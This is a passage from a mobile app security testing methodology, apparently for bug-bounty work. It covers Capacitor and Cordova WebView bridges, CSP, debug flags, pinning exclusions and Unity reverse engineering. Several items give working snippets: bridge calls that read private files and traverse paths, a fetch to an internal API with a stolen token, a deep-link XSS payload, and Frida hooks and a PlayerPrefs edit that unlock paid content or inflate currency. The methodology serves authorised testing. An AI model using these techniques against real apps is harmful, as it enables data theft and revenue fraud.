  request **natively**, copying the page's request headers through. The response is handed back to the page,
  so the WebView reads cross-origin bodies with no CORS check — and the request originates from the device,
  with the app's cookie jar and TLS settings.
- **How:**
  ```javascript
  const base = window.WEBVIEW_SERVER_URL;
  const u = encodeURIComponent('https://internal-api.target.local/admin/users');
  fetch(base + '/_capacitor_http_interceptor_?u=' + u,
        { headers: { 'Authorization': 'Bearer <token stolen via D19-049>' } })
    .then(r => r.text()).then(console.log);
  // the same capability is also a plain JS interface:
  console.log(typeof CapacitorHttpAndroidInterface);
  ```
- **Proof:** A cross-origin response body that a normal `fetch` would block, printed in the page, **and** the
  request observed arriving at the target host from the device's IP address.
- **Escalation:** Combine with `/_capacitor_file_` token theft to make authenticated internal requests; an
  internal-only host reached from a public web page is the Critical form. -> D15, D18.
- **Ruled out when:** `capacitor.plugins.json` does not register `CapacitorHttp`, the interceptor path returns
  404, and `typeof CapacitorHttpAndroidInterface` is `undefined` in the WebView. Test the interceptor path
  directly rather than inferring from the plugin list.

### D19-051 · Enumerate the full Capacitor plugin surface reachable from `androidBridge.postMessage`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for a Filesystem/exec-class plugin; otherwise rate by the capability the answering plugin holds |
| **Attacker** | AM-02 |
| **Applies to** | Capacitor Android |
| **Maps to** | Capacitor `MessageHandler.java` — installs the bridge as `WebViewCompat.addWebMessageListener(webView, "androidBridge", bridge.getAllowedOriginRules(), ...)` and **falls back to `webView.addJavascriptInterface(this, "androidBridge")` on exception or when `android.useLegacyBridge` is set**; `postMessage` dispatches on `type=="cordova"` versus plugin `pluginId`/`methodName`; `PluginManager.parsePluginsJSON()` reads `assets/capacitor.plugins.json`; MASWE-0033 (CWE-749, CWE-94) |

- **Test:** Every registered plugin method is invokable from JS by posting a JSON message. Enumerate the
  plugin list from the shipped asset, then call the dangerous ones. **The origin check exists only on the
  WebMessageListener path** — the `addJavascriptInterface` fallback (triggered by `android.useLegacyBridge:
  true`, or by any exception in the listener install) has **no origin restriction at all**, and iframes are
  rejected only on the listener path ("Plugin execution is allowed in Main Frame only").
- **How:**
  ```bash
  cat out/assets/capacitor.plugins.json
  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(d.get('android'))"
  # android.useLegacyBridge true => no origin gate on the bridge
  ```
  ```javascript
  Object.keys(Capacitor.Plugins);
  androidBridge.postMessage(JSON.stringify({
    type: 'message', callbackId: '1', pluginId: 'Filesystem', methodName: 'readFile',
    options: { path: '/data/data/<pkg>/shared_prefs/prefs.xml', directory: 'DOCUMENTS' }
  }));
  // Cordova-compat path through the same bridge:
  androidBridge.postMessage(JSON.stringify({
    type: 'cordova', callbackId: '2', service: 'File', action: 'readAsText', actionArgs: '["<path>"]'
  }));
  // and from a cross-origin iframe, to test the frame gate:
  // <iframe src="https://attacker.tld/x.html"> ... androidBridge.postMessage(...) ...
  ```
- **Proof:** A plugin response message carrying real data (file contents, contacts, camera path, geolocation)
  returned to script you injected — and, separately, the same call succeeding from a cross-origin iframe or
  from an off-origin page when `useLegacyBridge` is set.
- **Escalation:** A plugin call is native capability in the app's UID. Pair with D19-047/D19-048 for a fully
  remote chain; pair with D19-049 for the file read.
- **Ruled out when:** `capacitor.plugins.json` registers only UI/analytics plugins with no file, contacts,
  camera, secure-storage or device capability; `android.useLegacyBridge` is absent or `false`; and a
  `postMessage` from an off-origin page and from a cross-origin iframe both fail. Test all three conditions —
  the plugin list alone is not a rule-out because the Cordova-compat dispatch path reaches a different set.

### D19-052 · Cordova `_cordovaNative` bridge and its `bridgeSecret` gate

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when `exec()` succeeds from attacker content; High when only the bridge object is exposed off-origin |
| **Attacker** | AM-02 |
| **Applies to** | Cordova / Ionic-on-Cordova Android. The `minSdk<17` reflection escape applies to this interface as a **LEGACY** class |
| **Maps to** | Cordova `SystemWebViewEngine.java` (`webView.addJavascriptInterface(exposedJsApi, "_cordovaNative")`); `SystemExposedJsApi.java` (`@JavascriptInterface exec` / `setNativeToJsBridgeMode` / `retrieveJsMessages`, all taking `bridgeSecret`); `CordovaBridge.java` (`verifySecret`, `promptOnJsPrompt` handling `gap:`, `gap_bridge_mode:`, `gap_poll:`, `gap_init:`, and the "called from restricted origin" branch) |

- **Test:** Cordova exposes `exec()` through `addJavascriptInterface(exposedJsApi, "_cordovaNative")`, guarded
  by an integer `bridgeSecret` handed out only to a page from a permitted origin via a `gap_init:` JS prompt.
  Verify the gate actually holds for off-origin content, and check whether the prompt-based `gap:` bridge is
  reachable.
- **How:**
  ```javascript
  typeof _cordovaNative;                 // defined => the bridge object is present in this origin
  _cordovaNative.exec(-1, 'File', 'readAsText', 'cb', '["file:///data/data/<pkg>/shared_prefs/x.xml"]');
  // prompt-based path (CordovaBridge.promptOnJsPrompt):
  prompt('["<args>"]', 'gap:["<secret>","File","readAsText","cb"]');
  prompt('1', 'gap_poll:<secret>');
  prompt('', 'gap_init:');               // returns the secret only from a permitted origin
  ```
  ```bash
  adb logcat | grep -i "Bridge access attempt with wrong secret token"
  ```
- **Proof:** A plugin result returned to your script; or, on a correct implementation, the logcat line
  `Bridge access attempt with wrong secret token, possibly from malicious code. Disabling exec() bridge!` —
  which itself proves the bridge object was reachable and tells you which origin reached it.
- **Escalation:** `exec()` from attacker content is native capability execution -> D19-055 for the plugin
  method surface; -> D10 for the wider WebView chain.
- **Ruled out when:** `typeof _cordovaNative` is `undefined` from every off-origin page and iframe you can
  load, and `gap_init:` returns nothing from those origins while the logcat rejection line fires. Record the
  rejection line as the positive evidence of the negative.

### D19-053 · Cordova `AndroidInsecureFileModeEnabled` — a one-preference universal file-read SOP bypass

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1); `broken_authentication_and_session_management.authentication_bypass` (P1) once it lifts the session token |
| **Attacker** | AM-02 |
| **Applies to** | Cordova-Android. The secure default is the `https://localhost` scheme (`preference "scheme"`/`"hostname"`); the insecure mode is **LEGACY** compatibility and should never ship |
| **Maps to** | Cordova `SystemWebViewEngine.java` — the `preferences.getBoolean("AndroidInsecureFileModeEnabled", false)` branch calling `settings.setAllowFileAccess(true)` and `settings.setAllowUniversalAccessFromFileURLs(true)`; `ConfigXmlParser.getLaunchUrlPrefix()` (returns the `file://` launch prefix in that mode); MASWE-0033 |

- **Test:** This single preference switches the WebView back to a `file://` origin **and** enables both
  file access and universal access from file URLs. In that mode any script in the WebView can XHR any local
  file and any remote origin, with no CORS.
- **How:**
  ```bash
  grep -nE 'AndroidInsecureFileModeEnabled' out/res/xml/config.xml
  grep -rn 'setAllowUniversalAccessFromFileURLs\|setAllowFileAccessFromFileURLs' out/sources | head
  grep -nE '<preference name="(scheme|hostname)"' out/res/xml/config.xml
  ```
  ```javascript
  fetch('file:///data/data/<pkg>/shared_prefs/prefs.xml').then(r => r.text()).then(console.log);
  fetch('https://internal.target.local/').then(r => r.text()).then(console.log);   // no CORS
  ```
- **Proof:** `<preference name="AndroidInsecureFileModeEnabled" value="true"/>` in `config.xml`, plus a
  successful `file://` read and a successful cross-origin read from the page.
- **Escalation:** Combined with any HTML injection this is total local data disclosure plus a CORS-free proxy
  into anything the device can reach -> D11, D15, D18.
- **Ruled out when:** The preference is absent or `false`, the effective scheme is `https`/`http` with the
  `localhost` hostname (check `ConfigXmlParser`'s defaults, and confirm the observed origin in the WebView's
  `location.origin`), and `fetch('file:///...')` throws. Read the effective origin, do not assume it.

### D19-054 · Cordova plugins instantiated at startup via `onload`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | rated by behaviour; `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null) or the sink the plugin reaches |
| **Attacker** | AM-01/AM-03 depending on what the plugin does pre-authentication |
| **Applies to** | Cordova / Ionic-on-Cordova |
| **Maps to** | Cordova `ConfigXmlParser.java` (`paramType.equals("onload")` -> `onload = "true".equals(...)`) |

- **Test:** `ConfigXmlParser` honours `<param name="onload" value="true"/>`, instantiating the plugin before
  any page loads. Such a plugin runs regardless of whether the JS ever calls it, so it is a pre-authentication
  surface that a "the user must be logged in" argument does not cover.
- **How:**
  ```bash
  grep -n -B3 -A3 'onload' out/res/xml/config.xml
  grep -rn 'pluginInitialize()' out/sources | head
  # then watch what it does at launch:
  adb logcat -c && adb shell monkey -p <pkg> 1
  frida-trace -U -f <pkg> -i 'open*' -i 'connect*' -i 'dlopen*'
  ```
- **Proof:** A plugin listed with `onload="true"` whose `pluginInitialize()` performs network or file activity
  before any user interaction, confirmed with `frida-trace`/`strace` at launch.
- **Escalation:** Whatever the plugin reaches — a network fetch to an attacker-influenceable host is an
  unauthenticated remote surface; a file write is a D11/D17 primitive.
- **Ruled out when:** No `<feature>` carries an `onload` param, or the ones that do have empty
  `pluginInitialize()` bodies (read them, do not assume). A plugin loaded at startup that only registers a
  listener is not a finding.

### D19-055 · Audit every custom plugin's exposed method surface

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) for a path-taking method; `server_side_injection.sql_injection` (P1) where a method takes raw SQL; otherwise by capability |
| **Attacker** | AM-02 |
| **Applies to** | Cordova, Ionic, Capacitor |
| **Maps to** | Capacitor `MessageHandler.callPluginMethod` / `callCordovaPluginMethod` dispatch; `PluginManager.java` loading classes from `capacitor.plugins.json`; Cordova `ConfigXmlParser.java` (`<feature name=...><param name="android-package" value="<class>"/>`) |

- **Test:** Hand-written plugins are where the interesting bugs live: a `@PluginMethod` that takes a path, a
  URL or SQL and is callable from JS with no authorisation. Stock plugins are audited upstream; the app's own
  are not.
- **How:**
  ```bash
  jadx -d out target.apk
  grep -rn '@PluginMethod\|@CapacitorPlugin\|extends Plugin\b' out/sources | head -60
  grep -rn 'extends CordovaPlugin' out/sources | head -40
  grep -rn 'public boolean execute(' out/sources -A10 | head -60      # Cordova plugin entry point
  grep -rn '@Permission(' out/sources | head                          # what each plugin declares
  unzip -p target.apk assets/www/cordova_plugins.js | head -60
  ```
  For each, note the parameter names and then call it:
  ```javascript
  androidBridge.postMessage(JSON.stringify({
    type: 'message', callbackId: '9', pluginId: '<Plugin>', methodName: '<method>',
    options: { path: '../../../../data/data/<pkg>/databases/app.db' }
  }));
  cordova.exec(console.log, console.error, '<Service>', '<action>', ['../../../secrets.txt']);
  ```
- **Proof:** The plugin returning data for a path outside its intended directory, or executing an action the
  UI never offers, with the returned bytes shown.
- **Escalation:** File read/write -> D11/D17; SQL -> D15; shell -> P1 RCE; crypto -> D12; payment -> D23.
- **Ruled out when:** Every custom plugin method takes only enumerated constants or values the native side
  re-derives, and a traversal attempt against each path-taking method is rejected with a containment error
  you can show. Enumerate the methods explicitly in your notes — "the plugins looked fine" is not a
  defensible negative.

### D19-056 · The WebView is the entire app — run the full web methodology against the bundled assets

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) for the cross-user case; escalating to `server_side_injection.remote_code_execution_rce` (P1) via the bridge |
| **Attacker** | AM-02 |
| **Applies to** | Cordova, Ionic, Capacitor; and React Native apps rendering authenticated content in `react-native-webview` |
| **Maps to** | MASTG-TEST-0334, MASWE-0035 (CWE-79, CWE-601, CWE-829), MASWE-0033; Cordova whitelist docs ("Cordova apps are susceptible to XSS … secured by using the Cordova Whitelist Plugin and a strict CSP") |

- **Test:** For these frameworks there is no separate "native app" to test — the app *is* a web app with a
  native bridge. Run the whole web methodology against the bundled assets: DOM XSS sinks, `postMessage`
  handlers without origin checks, prototype pollution, client-side routing, `eval`/`innerHTML`. In a bridged
  WebView, XSS is not XSS — it is native capability execution.
- **How:**
  ```bash
  grep -rnE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function\(|dangerouslySetInnerHTML|\[innerHTML\]|bypassSecurityTrust' \
    out/assets/{www,public} 2>/dev/null | head -60
  grep -rnE 'addEventListener\(\s*["'\'']message' out/assets/{www,public} 2>/dev/null | head
  grep -rnE 'location\.(hash|search|href)|URLSearchParams|params\[' out/assets/{www,public} 2>/dev/null | head -40
  grep -rniE 'DISPLAY_NAME|filename|displayName|getLastPathSegment' out/assets/{www,public} 2>/dev/null
  grep -rniE 'resume|onResume|visibilitychange|refresh|exists|deleted' out/assets/{www,public} 2>/dev/null
  grep -rn 'appUrlOpen\|handleOpenURL\|window\.location' out/assets/{www,public} 2>/dev/null | head
  # drive a sink through the deep-link / appUrlOpen path:
  adb shell am start -a android.intent.action.VIEW \
    -d "<scheme>://x#<img src=x onerror=alert(typeof androidBridge)>" <pkg>
  ```
  Trace filename, title, label, MIME and URI-derived fields **backwards** to their source — second-order
  sinks (a filename rendered later on a list screen) are the productive ones here.
- **Proof:** A DOM XSS firing inside the app WebView **with the bridge object reachable from the injected
  script** — `alert(typeof androidBridge)` showing `object`, then one plugin call returning data. Use an 8+
  character random marker, and grep the baseline (no-marker) render for it first.
- **Escalation:** -> D19-049/D19-050/D19-051 (Capacitor) or D19-052 (Cordova) for the native half; -> D10 for
  the WebView configuration half; -> D09 for the delivery.
- **Ruled out when:** Every identified sink receives only values the app itself produced, a strict CSP without
  `unsafe-inline`/`unsafe-eval` is enforced (D19-057), and second-order fields (filenames, display names,
  server-supplied titles) are escaped at render — demonstrate one escaped render with your marker, do not
  infer it from the framework's reputation.

### D19-057 · The CSP meta tag is the last control once the allow-list is loose

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High/Critical as the enabling condition for the bridge chains |
| **VRT** | no standalone node — a missing CSP alone is on the never-submit list; file the chained outcome |
| **Attacker** | AM-02 |
| **Applies to** | Cordova, Ionic, Capacitor |
| **Maps to** | Cordova whitelist docs (CSP section, including the note that `gap:` is required for the bridge on iOS); Capacitor security guidance (CSP via meta tag) |

- **Test:** For these frameworks the CSP meta tag in `index.html` is the only real defence once
  `allow-navigation` is loose. Check for `unsafe-eval`/`unsafe-inline`, a wildcard `default-src *`, and a
  missing `connect-src`.
- **How:**
  ```bash
  grep -n 'Content-Security-Policy' out/assets/www/index.html out/assets/public/index.html 2>/dev/null
  # absent is the finding; weak looks like:
  #   default-src *; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
  ```
- **Proof:** No CSP meta tag at all, or one permitting `'unsafe-inline'`/`'unsafe-eval'` with `default-src *`
  — **then** demonstrate injected script executing and reaching the bridge. The policy text alone is not the
  report.
- **Escalation:** -> D19-056 and the bridge items. On its own this is a hygiene observation and belongs in
  the Graveyard.
- **Ruled out when:** A CSP is present, excludes `unsafe-inline` and `unsafe-eval`, scopes `default-src` and
  `connect-src` to concrete origins, and your injected script is actually blocked — show the console violation
  report, not the meta tag.

### D19-058 · `webContentsDebuggingEnabled` / `InspectableWebview` in the release build

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null); the chained outcome via the bridge is `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-11 physical unlocked, or anyone with ADB access to the device |
| **Applies to** | Cordova, Capacitor and React Native WebViews |
| **Maps to** | Capacitor `Bridge.java` (`WebView.setWebContentsDebuggingEnabled(this.config.isWebContentsDebuggingEnabled())`) and `CapConfig.java` (`android.webContentsDebuggingEnabled`, defaulting to `isDebug`); Cordova `SystemWebViewEngine.java` (`preferences.getString("InspectableWebview", null)` -> `WebView.setWebContentsDebuggingEnabled(true)`); `RNCWebViewManager.kt` (`RNCWebView.setWebContentsDebuggingEnabled(value)`) |

- **Test:** All three WebView frameworks expose a switch that enables remote debugging. In a release build
  this hands anyone with ADB a full JS console in the bridged origin — which, given D19-049/D19-051, is the
  whole app sandbox.
- **How:**
  ```bash
  grep -n '"webContentsDebuggingEnabled"' out/assets/capacitor.config.json
  grep -nE '<preference name="InspectableWebview"' out/res/xml/config.xml
  grep -a -n 'setWebContentsDebuggingEnabled' hbc.strings out/sources 2>/dev/null
  adb shell cat /proc/net/unix | grep -i webview_devtools
  # then open chrome://inspect and confirm the app's WebView is listed
  ```
- **Proof:** The WebView appearing in `chrome://inspect` for a **release-signed** build (prove the signature
  with `apksigner verify --print-certs`), and from that console `typeof androidBridge` / `typeof _cordovaNative`
  / `typeof window.ReactNativeWebView` returning `object`.
- **Escalation:** Combined with any bridge primitive this is local full-data compromise without root ->
  D19-049, D19-051, D19-052. If the bridge is absent it falls to Medium.
- **Ruled out when:** The preference is absent or explicitly `false`, no `webview_devtools_remote_` socket
  appears in `/proc/net/unix` while the app runs, and `chrome://inspect` lists nothing for the package. Test
  on the release build, not a debug build.

### D19-059 · Capacitor's native HTTP path silently skipping pinning

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (null) where the excluded host carries authentication material; the filed finding is what the intercepted traffic exposes |
| **Attacker** | AM-06 network attacker |
| **Applies to** | Capacitor Android with CapacitorHttp |
| **Maps to** | Capacitor `WebViewLocalServer.java` (`if (!isDomainExcludedFromSSL(bridge, url)) connection.setSSLSocketFactory(bridge);`) |

- **Test:** `handleCapacitorHttpRequest()` installs the pinning-aware socket factory only when the domain is
  **not** excluded. An excluded domain is an unpinned, interceptable channel that also carries whatever
  headers the page supplied — so the app's own "we pin" claim is true for some hosts and false for others.
- **How:**
  ```bash
  python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('plugins',{}))"
  grep -rn 'isDomainExcludedFromSSL\|danger\|acceptAllCerts\|sslPinning' out/sources out/assets/{www,public} 2>/dev/null | head
  ```
- **Proof:** A configured SSL-exclusion entry, plus successful interception of that host's traffic while other
  hosts stay pinned — show both sides of the comparison.
- **Escalation:** -> D14 and D15 for the intercepted traffic; if the excluded host carries the session token,
  the exclusion is the enabling condition for an ATO chain.
- **Ruled out when:** The plugin configuration contains no SSL-exclusion list and interception of every
  first-party host fails identically. Compare hosts — a single failed interception is not evidence that the
  exclusion list is empty.

### D19-060 · Capacitor scheme, `minWebViewVersion` and `allowMixedContent`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | no standalone node; it is the context that makes the D19-047 → D19-053 findings accurate, and `allowMixedContent` is the enabling condition for script injection into the bridge origin |
| **Attacker** | AM-06 for mixed content; AM-01 for the WebView-version gate |
| **Applies to** | Capacitor Android; the scheme half also applies to Cordova |
| **Maps to** | Capacitor `Bridge.java` (`settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW)` branch, `DEFAULT_ANDROID_WEBVIEW_VERSION = 60`, `DEFAULT_HUAWEI_WEBVIEW_VERSION = 10`, `allowedOriginRules` seeded with `scheme + "://" + authority` then each `server.allowNavigation` entry, prefixing bare hosts with `https://`); `CapConfig.java` (`server.androidScheme` default `https`, rejecting the invalid schemes `file, ftp, ftps, ws, wss, about, blob, data`; `android.allowMixedContent`, `android.useLegacyBridge`, `android.captureInput`, `android.zoomEnabled`, `android.resolveServiceWorkerRequests`; defaults `allowMixedContent=false`, `webContentsDebuggingEnabled=isDebug`, `minWebViewVersion=60`, `minHuaweiWebViewVersion=10`, `useLegacyBridge=false`); Cordova `ConfigXmlParser.java` (`preference "scheme"` default `https`, `"hostname"` default `localhost`) |

- **Test:** The local-server scheme determines the WebView's origin, and therefore which origin your
  allow-list and CSP actually apply to. Separately, `allowMixedContent: true` lets an on-path attacker inject
  script into the bridge origin, and a low `minWebViewVersion` admits an unpatched WebView.
- **How:**
  ```bash
  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(d.get('server',{}));print(d.get('android',{}))"
  grep -nE '<preference name="(scheme|hostname|AndroidInsecureFileModeEnabled)"' out/res/xml/config.xml
  adb shell dumpsys package com.google.android.webview | grep versionName
  # confirm the effective origin from inside the WebView:
  #   console: location.origin
  ```
- **Proof:** The effective origin (`https://localhost`, `http://localhost`, or a custom scheme) read off
  `location.origin`, together with `allowMixedContent: true` in the shipped config and an injected
  `http://` subresource executing in that origin.
- **Escalation:** Mixed content in a bridged WebView -> D19-049/D19-051; an origin mismatch between the
  allow-list/CSP and the actual scheme silently voids both.
- **Ruled out when:** `allowMixedContent` is absent or `false`, `minWebViewVersion` is at or above the default
  60, the scheme is `https`, and the CSP/allow-list are written for that exact origin. Read `location.origin`
  rather than trusting the config value — an invalid scheme silently falls back to `https`.

### D19-061 · Unity: recover the C# type graph from `libil2cpp.so` and `global-metadata.dat`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a as recon; `lack_of_binary_hardening.lack_of_obfuscation` (**P5**) if filed as a finding — do not |
| **Attacker** | n/a |
| **Applies to** | Unity IL2CPP Android builds. Il2CppDumper supports Unity **5.3–2022.2**; frida-il2cpp-bridge covers **5.3.0–6000.3.x**. Mono-backend builds instead ship managed `.dll` assemblies under `assets/bin/Data/Managed/` and are directly ILSpy-able |
| **Maps to** | Il2CppDumper README (outputs `DummyDll/`, `dump.cs`, `script.json`, `il2cpp.h`, `stringliteral.json`, `ida.py`, `ida_with_struct.py`, `ghidra.py`, `ghidra_wasm.py`, `Il2CppBinaryNinja`); frida-il2cpp-bridge README; MASTG-TECH-0165 |

- **Test:** IL2CPP ships `global-metadata.dat` alongside `libil2cpp.so`; together they regenerate near-complete
  class, method and field definitions — which is where all client-side game economy, entitlement and
  anti-cheat logic lives. Raw `libil2cpp.so` has no symbols, so without this step the binary is unreadable.
- **How:**
  ```bash
  unzip -o target.apk 'assets/bin/Data/Managed/Metadata/global-metadata.dat' 'lib/arm64-v8a/libil2cpp.so' -d ext/
  xxd -l 8 ext/assets/bin/Data/Managed/Metadata/global-metadata.dat     # expect AF 1B B1 FA -> 0xFAB11BAF
  Il2CppDumper.exe ext/lib/arm64-v8a/libil2cpp.so \
                   ext/assets/bin/Data/Managed/Metadata/global-metadata.dat ./out
  ls out/
  grep -nE 'IsPremium|Entitlement|Purchase|Verify|Licen[cs]e|Token|Secret' out/dump.cs | head -50
  grep -n '"Addresses"\|"ScriptMethod"\|"ScriptString"' out/script.json | head
  # restore symbols in the disassembler:
  #   IDA:    File > Script file... > ida_with_struct.py, pointed at script.json and il2cpp.h
  #   Ghidra: Script Manager > ghidra.py   (ghidra_wasm.py for WASM targets, with ghidra-wasm-plugin)
  # Mono backend instead:
  ls ext/assets/bin/Data/Managed/Assembly-CSharp.dll && ilspycmd ext/assets/bin/Data/Managed/Assembly-CSharp.dll | head -40
  ```
- **Proof:** `dump.cs` containing real namespaced classes with method RVAs, `DummyDll/*.dll` loading in
  dnSpy/ILSpy, and named functions appearing in the disassembler at the addresses `dump.cs` lists.
- **Escalation:** Feeds D19-063 (entitlement logic), D19-064 (PlayerPrefs call sites), D19-037 (keys in the
  blob), D19-011 (endpoints), and the crypto read below.
  ```bash
  grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' out/dump.cs | head -60
  ```
- **Ruled out when:** The app is Mono-backend (no `libil2cpp.so`), in which case read the managed assemblies
  directly and skip this item. `ERROR: Metadata file supplied is not valid metadata file.` is **not** a
  rule-out — go to D19-062.

### D19-062 · Unity: defeat encrypted, renamed or relocated `global-metadata.dat`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (metadata protection is a resilience control; report only what the recovered code reveals) |
| **Attacker** | n/a |
| **Applies to** | Unity IL2CPP Android with metadata obfuscation |
| **Maps to** | katyscode IL2CPP research (`IL2CPP_ASSERT(s_GlobalMetadataHeader->sanity == 0xFAB11BAF)`; the load chain `il2cpp_init()` -> `Runtime::Init()` -> `MetadataCache::Initialize()` -> `MetadataLoader::LoadMetadataFile()`; the `s_FrameworkVersion = framework_version_for(runtime_version)` `"4.0"` waypoint marking `Runtime::Init`; the XOR / renamed-file / embedded-metadata / JIT-decryption obfuscation classes); Il2CppDumper README (the error string, the GameGuardian memory-dump route, Zygisk-Il2CppDumper); Zygisk-Il2CppDumper README (`/data/data/GamePackageName/files/dump.cs`) |

- **Test:** When Il2CppDumper reports `ERROR: Metadata file supplied is not valid metadata file.`, the metadata
  is protected. Do not stop — recover it from memory or from the loader.
- **How:**
  ```bash
  xxd -l 8 assets/bin/Data/Managed/Metadata/global-metadata.dat     # AF 1B B1 FA = 0xFAB11BAF sanity value
  # 1) hunt a renamed or relocated file anywhere in the package:
  for f in $(unzip -l target.apk | awk '{print $4}'); do
    unzip -p target.apk "$f" 2>/dev/null | head -c 4 | xxd -p | grep -q 'af1bb1fa' && echo "METADATA: $f"; done
  # 2) find the loader statically:
  #    strings -> "global-metadata.dat" -> xrefs -> MetadataCache::Initialize -> MetadataLoader::LoadMetadataFile
  #    waypoint: the "4.0" framework-version string marks Runtime::Init
  # 3) runtime recovery (preferred — metadata-free):
  npm exec frida-il2cpp-bridge -- -f <pkg> dump --out-dir dumps
  # or Zygisk-Il2CppDumper (Magisk v24+ / Zygisk), then:
  adb shell su -c 'ls -l /data/data/<pkg>/files/dump.cs'
  adb shell su -c 'cat /data/data/<pkg>/files/dump.cs' > dump.cs
  ```
- **Proof:** A `dump.cs` with real class and method names produced despite the on-disk metadata being
  unreadable — quote a first-party namespace from it.
- **Escalation:** Feeds D19-063 and D19-037. Metadata encryption on its own is a resilience control — report
  what the recovered code reveals, not the fact that you recovered it.
- **Ruled out when:** No file in the package carries the `0xFAB11BAF` sanity value **and** both runtime paths
  fail on a rooted device with the game running. Record which of the obfuscation classes (XOR, renamed file,
  embedded metadata, JIT decryption) you identified, so the coverage limit is specific rather than vague.

### D19-063 · Unity: client-authoritative entitlement and economy logic in `dump.cs`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null — rated on the entitlement obtained); Critical where it produces direct revenue loss |
| **Attacker** | AM-12 own device for the manipulation; the impact is on the vendor |
| **Applies to** | Unity IL2CPP Android |
| **Maps to** | frida-il2cpp-bridge README (trace/intercept/replace method calls; `dump` subcommand); Il2CppDumper README (`dump.cs` with method/field/property information) |

- **Test:** Unity games commonly grant entitlements client-side and tell the server afterwards. Find the grant
  function, call it directly at runtime — then, and this is the whole finding, check whether the server
  accepts the resulting state.
- **How:**
  ```bash
  grep -nE 'class .*(Purchase|Shop|Store|Entitlement|Inventory|Wallet|Subscription|IAP)' out/dump.cs | head
  grep -nE '(bool|void) +(Is|Has|Grant|Unlock|Add)[A-Za-z]*\(' out/dump.cs | head -60
  grep -aiE 'react-native-iap|in_app_purchase|BillingClient|purchaseToken|acknowledgePurchase|consumePurchase' out/dump.cs | head
  ```
  ```javascript
  // frida-il2cpp-bridge
  Il2Cpp.perform(() => {
    const img = Il2Cpp.domain.assembly("Assembly-CSharp").image;
    const k = img.class("ShopManager");
    k.method("UnlockItem").implementation = function (id) {
      console.log("UnlockItem", id); return this.method("UnlockItem").invoke(id);
    };
    k.method("IsPremium").implementation = function () { return true; };
    const iap = img.class("IAPManager");
    iap.method("OnPurchaseComplete").implementation = function (p) {
      console.log("purchase", p); return this.method("OnPurchaseComplete").invoke(p);
    };
  });
  ```
- **Proof:** The premium or paid content unlocking **and the server accepting the resulting state** — prove
  it by logging in fresh on a second device and showing the entitlement persists. If the server re-validates,
  it is not a finding, and you should say so explicitly.
- **Escalation:** -> D23 payments and entitlements; a forged or replayed receipt accepted server-side is the
  Critical form.
- **Ruled out when:** A second device, freshly logged in, does not see the entitlement, and the server rejects
  the forged receipt (capture the 4xx). A local-only unlock that resets on reinstall is at most Medium and
  usually not worth filing.

### D19-064 · Unity: PlayerPrefs and `persistentDataPath` treated as authoritative state

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) when the server accepts the edited value; `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) if filed as a storage issue — do not |
| **Attacker** | AM-12 own device |
| **Applies to** | Unity Android |
| **Maps to** | Il2CppDumper `dump.cs` (used to locate the `PlayerPrefs` call sites) |

- **Test:** Unity games routinely persist currency, entitlements and progression in `PlayerPrefs` or under
  `Application.persistentDataPath`, then trust the value on load.
- **How:**
  ```bash
  grep -nE 'PlayerPrefs\.(Set|Get)(Int|Float|String)|persistentDataPath' out/dump.cs | head -40
  adb shell "run-as <pkg> ls -la shared_prefs/ files/"
  adb shell "run-as <pkg> cat shared_prefs/<pkg>.v2.playerprefs.xml"
  adb shell "run-as <pkg> sh -c 'sed -i s/\"coins\">100</\"coins\">999999</ shared_prefs/<pkg>.v2.playerprefs.xml'"
  adb shell am force-stop <pkg> && adb shell monkey -p <pkg> 1
  ```
- **Proof:** The modified value reflected in the UI after relaunch **and** accepted by the server — a
  purchase, redeem or leaderboard call succeeding with the inflated balance, shown in the proxy.
- **Escalation:** -> D23; -> D15 where the value is sent as a request field the server trusts.
- **Ruled out when:** The server re-derives the value on every read (the inflated balance disappears after a
  sync, captured in the proxy). Do not report it in that case — say the state is server-authoritative.

### D19-065 · Unity: exported player activity, intent extras, and the `unity` CLI extras bridge

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the CLI-extras library-load path; `broken_access_control.exposed_sensitive_android_intent` (null) for the general extras case |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | Unity Android apps exporting `UnityPlayerActivity` / `UnityPlayerGameActivity`. Note the `targetSdk<31` gate — with an intent-filter present, exported is the default |
| **Maps to** | **CVE-2025-59489** (arbitrary code execution in the Unity Runtime; Unity advisory "Security Sept-2025-01"); MASTG-TECH-0160; Il2CppDumper README |

- **Test:** Unity apps typically export a player activity as `MAIN`/`LAUNCHER`, and the Unity runtime honours
